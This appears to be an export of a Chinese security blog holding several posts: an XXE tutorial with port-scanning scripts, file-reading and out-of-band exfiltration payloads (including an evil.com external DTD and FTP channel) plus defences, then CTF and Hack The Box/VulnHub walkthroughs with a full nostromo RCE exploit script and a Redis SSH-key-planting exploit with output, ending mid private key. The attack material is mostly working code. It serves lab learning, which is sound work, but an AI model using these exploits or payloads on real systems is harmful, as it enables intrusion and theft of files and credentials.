&#x27;/&#x27; XXE(ip,string) 注意替换一下IP地址的网段。这个脚本跑的确实很慢，结果如下： 12345678[+] 192.168.50.1 Successfully Found !!!......[-] 192.168.50.130 Error Not Found !!![-] 192.168.50.131 Error Not Found !!![+] 192.168.50.132 Successfully Found !!![+] 192.168.50.133 Successfully Found !!!... HTTP内网主机探测端口 找到了内网的主机，还需要对其端口进行扫描，原理和上面一致，只不过IP固定，遍历端口，我们先用Burp Suite看一下端口开放和关闭的response有什么不同： 如果端口是关闭的，一般都会返回Connection refuse。 下面放出Payload。 123456789101112131415161718import requestsimport base64def XXE(port): xml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &quot;&quot;&quot; xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE data SYSTEM &quot;http://192.168.50.132:&quot;&quot;&quot; + str(port) + &quot;&quot;&quot;/&quot; [&quot;&quot;&quot; xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;!ELEMENT data (#PCDATA)&gt; &quot;&quot;&quot; xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;]&gt;&quot;&quot;&quot; xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;data&gt;7&lt;/data&gt;&quot;&quot;&quot; r = requests.post(&#x27;http://192.168.50.132/xxe_blind_test.php&#x27;, data=xml,timeout=5) #print(port,r.elapsed.total_seconds()) if (&quot;Connection refused&quot; in r.text): print(&quot; [-]&quot;, port, &quot; seems shut down&quot;) else: print(&quot; [+]&quot;, port, &quot;is up&quot;)if __name__ == &#x27;__main__&#x27;: for i in range(9080,9082): XXE(i) 笔者测试发现不同的环境，结果可能会不一样，因此可能需要不同的payload进行端口扫描，这个需要具体结合代码和测试结果来敲定一个有效的payload。 如何挖掘XXE漏洞 常用检测方法 首先查看XML是否可以成功解析 1234&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY name &quot;test1&quot;&gt;]&gt; &lt;root&gt;&amp;name;&lt;&#x2F;root&gt; 如果页面输出了test1，则可以解析XML。 第二步查看是否支持DTD引用外部实体： 12345&lt;?xml version&#x3D;”1.0” encoding&#x3D;”UTF-8”?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY % name SYSTEM &quot;http:&#x2F;&#x2F;myhost&#x2F;index.html&quot;&gt; %name; ]&gt; 然后在我的服务器上查看日志,如果有目标服务器向我的服务器发送了一条index.html的请求,说明 支持引用外部实体,很有可能存在xxe漏洞。 外部普通实体 当有回显时，利用file://协议: 12345&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE lltest[ &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;Windows&#x2F;win.ini&quot;&gt;]&gt; &lt;user&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt; 外部参数实体 当无回显，使用http协议: 12345&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE note[ &lt;!ENTITY % lltest SYSTEM &quot;http:&#x2F;&#x2F;myhost:1234&#x2F;test_xxe&quot;&gt;%lltest;]&gt; 然后在myhost监听1234端口(dnslog地址也可以),查看是否有http请求。 Json Content-type XXE 很多Web与App应用都是基于客户端-服务器交互的Web通信服务,最常见的数据格式就是Json与XML，尽管web服务可能只使用一种格式，但是服务器却可以接收开发人员没有料到的其他数据格式，有可能导致Json节点受到XXE攻击。 测试方法很简单,就是将Content-Type: application/json修改为Content-Type: application/xml，数据格式不变，查看是否报错: &#123;&quot;errors&quot;:&#123;&quot;errorMessage&quot;:&quot;org.xml.sax.SAXParseException: XML document structures must start and end within the same entity.&quot;&#125;&#125; 可以发现服务器是可以处理xml数据的，于是我们利用这个来进行攻击。 payload: 123456789...Content-Type: application&#x2F;xml...&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt;]&gt;&lt;root&gt;&lt;param1&gt;name&lt;&#x2F;param1&gt;&lt;param2&gt;&amp;xxe;&lt;&#x2F;param2&gt;&lt;&#x2F;root&gt; 查看是否可以读取敏感文件。 利用FTP协议获取敏感信息 利用ftp协议获取服务器信息/内网ip之类的技巧： 在攻击者服务器上运行rb脚本(模拟FTP服务器:https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb),监听8080端口。 然后在web程序那里输入payload: 1234567&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY % asd SYSTEM &quot;http:&#x2F;&#x2F;evil.com&#x2F;ext.dtd&quot;&gt; %asd; %rrr; ]&gt;&lt;a&gt;&lt;&#x2F;a&gt; ext.dtd 12&lt;!ENTITY % b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;&lt;!ENTITY % c &quot;&lt;!ENTITY &amp;#37; rrr SYSTEM &#39;ftp:&#x2F;&#x2F;evil.com:8000&#x2F;%b;&#39;&gt;&quot;&gt; 然后在模拟的FTP服务器上就会收到一些服务器信息/文件内容 技巧来自：http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html Bypass 123&lt;!DOCTYPE :. SYTEM &quot;http:&#x2F;&#x2F;&quot;&lt;!DOCTYPE :_-_: SYTEM &quot;http:&#x2F;&#x2F;&quot;&lt;!DOCTYPE &#123;0xdfbf&#125; SYSTEM &quot;http:&#x2F;&#x2F;&quot; XXE如何防御 1、使用开发语言提供的禁用外部实体的方法 php: 1libxml_disable_entity_loader(true); java: 12DocumentBuilderFactory dbf &#x3D;DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false); Python: 12from lxml import etreexmlData &#x3D; etree.parse(xmlSource,etree.XMLParser(resolve_entities&#x3D;False)) 2、过滤用户提交的XML数据 过滤关键字：&lt;\\!DOCTYPE和&lt;\\!ENTITY，或者SYSTEM和PUBLIC。 3、不允许XML中含有自己定义的DTD CTF中的XXE api调用 题目地址：http://web.jarvisoj.com:9882/ 题目描述：请设法获得目标机器/home/ctf/flag.txt中的flag值。 Fake XML Cookbook 题目地址：https://buuoj.cn/challenges 题目说明： 12345&#x3D;&#x3D;Difficulty: easy&#x3D;&#x3D;flag is in &#x2F;flag&#x3D;&#x3D;Author zjy&#x3D;&#x3D; exp： 1234567891011import requestsurl = &quot;http://127.0.0.1/php_xxe/doLogin.php&quot;payload = &#x27;&#x27;&#x27;&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY foo SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;foo;&lt;/username&gt;&lt;password&gt;0&lt;/password&gt;&lt;/user&gt;&#x27;&#x27;&#x27;r = requests.post(url,data=payload,headers=&#123;&#x27;Content-Type&#x27;:&#x27;text/xml&#x27;&#125;)print r.text True XML cookbook https://blog.csdn.net/winner0911/article/details/50600494 [CSAWQual 2019]Web_Unagi 使用utf-16编码绕过WAF上传xml文件读取flag 12345678910111213&lt;?xml version=&#x27;1.0&#x27; encoding=&quot;utf-16&quot;?&gt;&lt;!DOCTYPE users [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;&lt;users&gt; &lt;user&gt; &lt;username&gt;Bob&lt;/username&gt; &lt;password&gt;passwd2&lt;/password&gt; &lt;name&gt; &amp;xxe;&lt;/name&gt; &lt;email&gt;bob@fakesite.com&lt;/email&gt; &lt;group&gt;CSAW2019&lt;/group&gt; &lt;intro&gt;&amp;xxe;&lt;/intro&gt; &lt;/user&gt;&lt;/users&gt; utf-16编码 上传 Update https://www.freebuf.com/vuls/207639.html 无法引用外部DTD文件的前提下，无回显利用XXE注入： 引用内部实体 123456789101112&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % remote SYSTEM &quot;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt; &lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt; &lt;!ENTITY % ISOamso &#39; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file:&#x2F;&#x2F;hhhhhhhh&#x2F;?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;send; &#39;&gt; %remote;]&gt;&lt;message&gt;1234&lt;&#x2F;message&gt; 三层嵌套 1234567891011&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ELEMENT message ANY&gt; &lt;!ENTITY % para1 SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt; &lt;!ENTITY % para &#39; &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt; &amp;#x25;para2; &#39;&gt; %para;]&gt;&lt;message&gt;10&lt;&#x2F;message Reference xxe injector tool：https://github.com/enjoiz/XXEinjector XXE payload list：https://github.com/payloadbox/xxe-injection-payload-list 一篇文章带你深入理解漏洞之 XXE 漏洞 XXE漏洞总结 XXE学习笔记 XXE实体注入 Blind XXE经典payload引发的脑洞","tags":[{"name":"Web安全学习","slug":"Web安全学习","permalink":"http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"},{"name":"xxe漏洞","slug":"xxe漏洞","permalink":"http://ca0y1h.top/tags/xxe%E6%BC%8F%E6%B4%9E/"}],"categories":[{"name":"Web安全","slug":"Web安全","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"Web安全/基础学习","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"VulnHub::DC-1-walkthrough","date":"2020-02-19T10:03:20.000Z","path":"Target_drone/VulnHub/2.VulnHub-DC-1-walkthrough/","text":"VulnHub::DC-1 Walkthrough 0x01 Introduction DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing. It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn. To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS. There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners. There are five flags in total, but the ultimate goal is to find and read the flag in root’s home directory. You don’t even need to be root to do this, however, you will require root privileges. Depending on your skill level, you may be able to skip finding most of these flags and go straight for root. Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge. 0x02 Tools and Tips nmap JohnTheRipper Drupal Geddon 2 Forms API Property Injection Drupal Geddon SQL Injection (Add admin user) 0x03 Pentesting 查找靶机IP： 查找靶机端口和服务： 从drupal 7下手，在metasploit中查看相关漏洞： 发现drupal_drupalgeddon2可以成功exploit，进行相关配置： 使用Python命令获取正常tty，获得第一个flag1.txt： 提示我们去找配置文件，Google一下drupal站点的配置文件目录： 不仅得到flag2的内容，还有MySQL数据库的连接用户和密码，尝试登录： 查询用户表的账号和密码： 用JohnTheRipper爆破密码： 使用Fred账号登录后台，没有flag或hint，尝试获取后台管理员权限，用searchexploit查找相关利用： 根据提示新增一个管理员用户： 在数据库中查询发现成功插入： 登录后台系统，在contents中获得flag3： 看一下flag3，要我们去查看shadow文件，看到perm猜测是不是suid提权： find命令可以用来提权： 输入find . -exec /bin/sh \\; -quit： 有一个flag4的用户，进入主目录发现flag4.txt： 进入root主目录，发现最后一个flag： 0x04 Extra 根据flag3的提示，期望的做法应该是用find命令查询： 命令解释：https://blog.csdn.net/u010900754/article/details/83020378?utm_source=distribute.pc_relevant.none-task 拿到密码的sha256，试试能不能爆破密码出来： ssh登录成功：","tags":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"VulnHub","slug":"靶机/VulnHub","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/VulnHub/"}]},{"title":"VulnHub::BossplayersCTF-walkthrough","date":"2020-02-15T10:57:12.000Z","path":"Target_drone/VulnHub/1.VulnHub-BossplayersCTF-walkthrough/","text":"VulnHub::BossplayersCTF Walkthrough 0x01 Introduction Aimed at Beginner Security Professionals who want to get their feet wet into doing some CTF’s. It should take around 30 minutes to root. FROM: https://www.vulnhub.com/entry/bossplayersctf-1,375/ 0x02 Tools and Tips netdiscover nmap 0x03 Pentesting netdiscover扫描内网段： 靶机IP地址192.168.0.104，nmap查看开放端口： 80端口上运行着Apache2.3.48，dirsearch和gobuster扫描网站目录： logs.php和robots.txt都没有什么可以利用的地方，index.html查看源代码： 三次base64解码得到一个后台网页： 提示我们可能存在命令执行漏洞，尝试一下?cmd=pwd： 成功得到回显，再反弹shell，本地监听4444端口： 再返回标准shell 跑一下提权脚本LinEnum.sh，注意到find命令是以root身份执行的： 在GTFObins上查找一下： 根据提示执行find . -exec /bin/sh -p \\; -quit 成功获取root权限。 0x04 Reference https://blog.csdn.net/weixin_44214107/article/details/102493939","tags":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"VulnHub","slug":"靶机/VulnHub","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/VulnHub/"}]},{"title":"Tmux快捷键备忘录","date":"2020-02-14T12:11:10.000Z","path":"Other/5.Tmux快捷键备忘录/","text":"Tmux Cheatsheet oh-my-tmux：https://github.com/gpakosz/.tmux &lt;prefix&gt; = Ctrl + a 或 Ctrl + b &lt;prefix&gt; c = Ctrl + a (or Ctrl + b) + c &lt;prefix&gt; C-c = Ctrl + a (or Ctrl + b) Ctrl + c tmux命令： tmux detach 或 &lt;preifx&gt; d 分离当前session tmux ls 查看所有session tmux attach -t 0 根据session id接入某个session tmux kill-session -t 0 根据session id杀死某个session tmux快捷键： &lt;prefix&gt; e 修改~/.tmux.conf.local &lt;prefix&gt; r 重新载入配置文件 &lt;prefix&gt; C-l clears both the screen and the tmux history &lt;prefix&gt; C-c 新建session &lt;prefix&gt; C-f 根据session_name切换session &lt;prefix&gt; s 列出所有session &lt;prefix&gt; c 新建window &lt;prefix&gt; C-h and &lt;prefix&gt; C-l 向前、向后切换window &lt;prefix&gt; Tab 切换上一个活动window &lt;prefix&gt; | 垂直分割panes &lt;prefix&gt; _ 水平分割panes &lt;prefix&gt; h, &lt;prefix&gt; j, &lt;prefix&gt; k and &lt;prefix&gt; l 光标切换到其他panes，类似Vim &lt;prefix&gt; H, &lt;prefix&gt; J, &lt;prefix&gt; K, &lt;prefix&gt; L let you resize panes &lt;prefix&gt; &lt; and &lt;prefix&gt; &gt; 交换panes位置 &lt;prefix&gt; + 当前panes全屏显示，再使用一次会变回原来大小 &lt;prefix&gt; m 是否启用鼠标模式 &lt;prefix&gt; U launches Urlview (if available) &lt;prefix&gt; F launches Facebook PathPicker (if available) &lt;prefix&gt; Enter 进入复制模式 &lt;prefix&gt; b 列出剪切板中的内容 &lt;prefix&gt; p 粘贴剪切板中的第一条内容 &lt;prefix&gt; P 从剪切板中选择内容粘贴","tags":[{"name":"Tmux","slug":"Tmux","permalink":"http://ca0y1h.top/tags/Tmux/"}],"categories":[{"name":"技术随笔","slug":"技术随笔","permalink":"http://ca0y1h.top/categories/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"}]},{"title":"HTB::Traverxec Walkthrough","date":"2020-02-14T12:04:33.000Z","path":"Target_drone/HackTheBox/3.HTB-Traverxec-walkthrough/","text":"HTB::Traverxec Walkthrough 0x01 Introduction 0x02 Tools and Tips nmap searchexploit nostromo 1.9.6 LinEnum.sh JohnTheRipper GTFObins 0x03 Penetration Test nmap扫描端口： 123456789101112131415Nmap scan report for 10.10.10.165Host is up (0.083s latency).Not shown: 65533 filtered portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)| ssh-hostkey:| 2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)| 256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)|_ 256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)80/tcp open http nostromo 1.9.6|_http-server-header: nostromo 1.9.6|_http-title: TRAVERXECService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results athttps://nmap.org/submit/ . 浏览器打开10.10.10.165，有一个发邮件的功能： 多次测试发现没什么用，感觉这个网站是个半成品。但是我们注意到他用的中间件是nostromo 1.9.6，查一下有没有相关的exploit 刚好有一个远程代码执行的漏洞可以利用。 直接利用获取shell 再返回一个交互式shell，python -c &quot;import pty;pty.spawn('/bin/bash')&quot; 在本机上启动一个服务器，将提权脚本传到靶机： 给执行权限：chmod +x LinEnum.sh，执行脚本./LinEnum.sh： 发现有一个david用户，还找到了一个密码： 用JohnTheRipper尝试解密： 尝试用Nowonly4me连接ssh以及su密码发现都不正确。并且不能直接cd进入/home/david目录。Google了一下思路，网上说仔细看看配置文件： 在HOMEDIRS中配置一个homedirs_public路径，试一下看能不能进入： 发现了一个压缩文件，在/tmp目录下解压： 把这个密钥copy到主机用JohnTheRipper爆破： 爆破出密钥的认证密码hunter，用SSH连接，得到user.txt： 123456789101112131415david@traverxec:~$ cd /home/david/david@traverxec:~$ ls -latotal 36drwx--x--x 5 david david 4096 Oct 25 17:02 .drwxr-xr-x 3 root root 4096 Oct 25 14:32 ..lrwxrwxrwx 1 root root 9 Oct 25 16:15 .bash_history -&gt; /dev/null-rw-r--r-- 1 david david 220 Oct 25 14:32 .bash_logout-rw-r--r-- 1 david david 3526 Oct 25 14:32 .bashrcdrwx------ 2 david david 4096 Oct 25 16:26 bin-rw-r--r-- 1 david david 807 Oct 25 14:32 .profiledrwxr-xr-x 3 david david 4096 Oct 25 15:45 public_wwwdrwx------ 2 david david 4096 Oct 25 17:02 .ssh-r--r----- 1 root david 33 Oct 25 16:14 user.txtdavid@traverxec:~$ cat user.txt7db0b[--------------------]d9782f3d 在这个目录下还有一个bin文件夹： 我们基本上看到它只是输出一个HEAD（bin目录中的另一个文件）和有关服务器的一些信息。 该脚本的最后一行是最重要的，它先运行sudo，然后运行journalctl，也就是说journalctl正在以root的特权运行，因此，如果我们能控制journalctl也就拥有root特权。 但是，我们似乎无法更改任何参数。 运行除sudo journalctl -n5 -unostromo.service以外的任何内容时，将要求提供密码。 没什么思路，只能再一次求助Google，提示我们用GTFObins： 运行/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service时，把窗口缩小一点，再输入!/bin/sh，成功获得root权限： 0x04 Summary Traverxec是一个基于Linux的靶机，开放了普通的22和80端口，80端口上运行的网站没有什么可以利用的，但是网站的中间件服务nostromo 1.9.6有一个目录穿越绕过进而造成代码执行的漏洞，以www-data权限进入靶机后，发现/home/david目录不可达。但是查看nostromo文档发现，配置文件有一个HOMEDIRS的选项，其中homedirs_public属性指定了网站的主目录，发现/home/david/pulic_www/是可达的，里面有david的私钥。提权的过程查了一下Google，发现/home/david/bin目录下有一个脚本，而且/usr/bin/journalctl是作为 root 运行的，查看 GTFObins，发现通过 sudo 运行的 journalctl 可以被利用来提权，缩小窗口进而触发pager，获得root权限。 0x05 nostromo 1.9.6 exploit 源码分析一下nostromo 1.9.6的目录穿越漏洞。先贴上利用代码： 1234567891011121314151617181920212223242526272829303132333435help_menu = &#x27;\\r\\nUsage: cve2019-16278.py &lt;Target_IP&gt; &lt;Target_Port&gt; &lt;Command&gt;&#x27;def connect(soc): response = &quot;&quot; try: while True: connection = soc.recv(1024) if len(connection) == 0: break response += connection except: pass return responsedef cve(target, port, cmd): soc = socket.socket() soc.connect((target, int(port))) payload = &#x27;POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\\r\\nContent-Length: 1\\r\\n\\r\\necho\\necho\\n&#123;&#125; 2&gt;&amp;1&#x27;.format(cmd) soc.send(payload) receive = connect(soc) print(receive)if __name__ == &quot;__main__&quot;: print(art) try: target = sys.argv[1] port = sys.argv[2] cmd = sys.argv[3] cve(target, port, cmd) except IndexError: print(help_menu) 首先，服务器会验证请求然后处理它。 在上图的函数http_verify()中，请求的首行会先进行解码，然后检查/../是否存在。注意，此时攻击请求的首行包含/.\\r./.\\r./.\\r./.\\r./bin/sh。 接下来，函数http_proc()会将首行传递给函数http_header()。 漏洞根源就在这，函数http_header()会通过函数strcutl()解析数据。 而在函数strcutl()的内部，你可以看到它会把字符串中的\\r（回车）去除。 最后，得到的路径是/../../../../bin/sh。那么，目录穿越完成，命令执行如何进行呢？在函数http_proc()中的execve()函数（用于执行指定程序）中，它执行了rh-&gt;rq_filef，这正是路径过滤后的结果/../../../../bin/sh。 于是，我们就得到了一个可导致RCE的目录穿越。 不得不说发现这个漏洞的师傅代码审计能力真强，我们都是弟弟。 0x05 Reference https://blog.csdn.net/JBlock/article/details/88619117","tags":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"靶机/HTB","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"}]},{"title":"HTB::Postman Walkthrough","date":"2020-02-11T11:24:00.000Z","path":"Target_drone/HackTheBox/2.HTB-Postman-walkthrough/","text":"HTB::Postman Walkthrough 0x01 靶机介绍 0x02 使用工具和知识点 nmap redis server LinEnum.sh ssh2john.py John lse.sh webmin_packageup_rce 0x03 渗透过程 扫描目标主机所有端口： 123456789101112131415161718kali@kali:~$ nmap -A -Pn -T4 -p- 10.10.10.160Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-09 23:18 ESTNmap scan report for postman.htb (10.10.10.160)Host is up (0.34s latency).Not shown: 65531 filtered portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)| 256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)|_ 256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-title: The Cyber Geek&#x27;s Personal Website6379/tcp open redis Redis key-value store 4.0.910000/tcp open http MiniServ 1.910 (Webmin httpd)|_http-server-header: MiniServ/1.910|_http-trane-info: Problem with XML parsing of /evox/aboutService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 主要来看一下80、6379和10000端口。 80端口： 6379端口： 10000端口： 通常80端口没有什么利用的东西，10000端口上运行Webmin服务尝试弱口令没有效果，而redis服务暴露在6379端口，可以从这里下手，Googleredis key store 4.0.9 expolit，找到下面利用方式 https://github.com/Avinash-acid/Redis-Server-Exploit 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#!/usr/bin/python#Author : Avinash Kumar Thapa aka -Acid#Twitter : https://twitter.com/m_avinash143#####################################################################################################################################################import osimport os.pathfrom sys import argvfrom termcolor import coloredscript, ip_address, username = argvPATH=&#x27;/usr/bin/redis-cli&#x27;PATH1=&#x27;/usr/local/bin/redis-cli&#x27;def ssh_connection(): shell = &quot;ssh -i &quot; + &#x27;$HOME/.ssh/id_rsa &#x27; + username+&quot;@&quot;+ip_address os.system(shell)if os.path.isfile(PATH) or os.path.isfile(PATH1): try: print colored(&#x27;\\t*******************************************************************&#x27;, &quot;green&quot;) print colored(&#x27;\\t* [+] [Exploit] Exploiting misconfigured REDIS SERVER*&#x27; ,&quot;green&quot;) print colored(&#x27;\\t* [+] AVINASH KUMAR THAPA aka &quot;-Acid&quot; &#x27;, &quot;green&quot;) print colored(&#x27;\\t*******************************************************************&#x27;, &quot;green&quot;) print &quot;\\n&quot; print colored(&quot;\\t SSH Keys Need to be Generated&quot;, &#x27;blue&#x27;) os.system(&#x27;ssh-keygen -t rsa -C \\&quot;acid_creative\\&quot;&#x27;) print colored(&quot;\\t Keys Generated Successfully&quot;, &quot;blue&quot;) os.system(&quot;(echo &#x27;\\r\\n\\&#x27;; cat $HOME/.ssh/id_rsa.pub; echo \\&#x27;\\r\\n\\&#x27;) &gt; $HOME/.ssh/public_key.txt&quot;) cmd = &quot;redis-cli -h &quot; + ip_address + &#x27; flushall&#x27; cmd1 = &quot;redis-cli -h &quot; + ip_address os.system(cmd) cmd2 = &quot;cat $HOME/.ssh/public_key.txt | redis-cli -h &quot; + ip_address + &#x27; -x set cracklist&#x27; os.system(cmd2) cmd3 = cmd1 + &#x27; config set dbfilename &quot;backup.db&quot; &#x27; cmd4 = cmd1 + &#x27; config set dir&#x27; + &quot; /usr/lib/&quot;+username+&quot;/.ssh/&quot; cmd5 = cmd1 + &#x27; config set dbfilename &quot;authorized_keys&quot; &#x27; cmd6 = cmd1 + &#x27; save&#x27; os.system(cmd3) os.system(cmd4) os.system(cmd5) os.system(cmd6) print colored(&quot;\\tYou&#x27;ll get shell in sometime..Thanks for your patience&quot;, &quot;green&quot;) ssh_connection() except: print &quot;Something went wrong&quot;else: print colored(&quot;\\tRedis-cli:::::This utility is not present on your system. You need to install it to proceed further.&quot;, &quot;red&quot;) 执行python2 exp.py 10.10.10.160 redis，SSH登录靶机： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051kali@kali:~/Desktop/HTB Scripts/Redis$ python2 exp.py 10.10.10.160 redis ******************************************************************* * [+] [Exploit] Exploiting misconfigured REDIS SERVER* * [+] AVINASH KUMAR THAPA aka &quot;-Acid&quot; ******************************************************************* SSH Keys Need to be GeneratedGenerating public/private rsa key pair.Enter file in which to save the key (/home/kali/.ssh/id_rsa): Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/kali/.ssh/id_rsa.Your public key has been saved in /home/kali/.ssh/id_rsa.pub.The key fingerprint is:SHA256:wMzHMZr3ew4dVP3cXrwsWg7JF7ay4peQHLplhK7BDww acid_creativeThe key&#x27;s randomart image is:+---[RSA 3072]----+| o .. || + + o . .|| B = . oo|| E = + . o *|| + . S = + +.o|| = o * B * o.|| = + + % . || . o . O . || ..o . |+----[SHA256]-----+ Keys Generated SuccessfullyOKOKOK(error) ERR Changing directory: No such file or directoryOKOK You&#x27;ll get shell in sometime..Thanks for your patienceWelcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatchFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsLast login: Mon Feb 10 08:46:56 2020 from 10.10.15.125redis@Postman:~$ pwd/var/lib/redis 直接查看/etc/passwd和/home目录，发现有一个Matt用户，而且user.txt权限也属于Matt。设法提升权限，/opt目录下有一个id_rsa.bak文件： 123456789101112131415161718192021222324252627282930-----BEGIN RSA PRIVATE KEY-----Proc-Type: 4,ENCRYPTEDDEK-Info: 